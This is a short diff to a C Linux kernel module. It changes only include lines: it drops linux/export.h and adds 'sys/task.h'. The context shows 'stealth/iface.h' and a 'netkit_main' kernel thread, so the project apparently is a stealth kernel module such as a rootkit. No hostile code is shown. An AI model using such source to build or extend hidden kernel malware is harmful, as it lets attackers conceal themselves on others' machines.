@@ -1,6 +1,5 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/export.h>
 #include <linux/kthread.h>
 #include <linux/crypto.h>
 
@@ -8,6 +7,7 @@
 #include "stealth/iface.h"
 #include "io/iface.h"
 #include "sys/lock.h"
+#include "sys/task.h"
 
 static int netkit_main(void* args)
 {
